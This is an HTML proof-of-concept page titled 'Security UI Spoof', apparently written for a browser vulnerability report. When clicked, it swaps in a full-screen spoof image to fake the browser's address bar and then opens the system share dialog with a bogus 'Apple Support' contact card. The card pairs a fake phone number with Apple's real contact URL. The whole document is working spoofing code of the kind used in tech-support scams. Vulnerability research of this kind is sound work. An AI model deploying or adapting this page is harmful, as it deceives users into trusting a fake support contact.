<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" />
  <title>Security UI Spoof</title>
  <style>
    html, body { height: 100%; margin: 0; padding: 0; }
    #spoof { width: 100%; height: 100%; display: none; }
    #content { width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; }
  </style>
  <script>
    // When the page is clicked, run the behaviour and open share dialog
    document.addEventListener('click', async () => {
      // show spoof image / hide content / try fullscreen
      document.getElementById("spoof").style.display = "block";
      document.getElementById("content").style.display = "none";
      try { await document.documentElement.requestFullscreen(); } catch(e){}

      // open share dialog
      if(navigator.share){
        try {
          await navigator.share({
            title:'Contact Info',
            text:'Name: Apple Support\nPhone: +2123239\nWebsite: https://www.apple.com/contact/'
          });
        } catch(err) {
          console.log(err);
        }
      } else {
        alert('Share not supported');
      }
    }, { once: true });
  </script>
</head>
<body>
  <img id="spoof" src="spoof.png" alt="spoof image" />
  <div id="content">
    <h1>Click anywhere on the page to spoof the omnibox!</h1>
  </div>
</body>
</html>
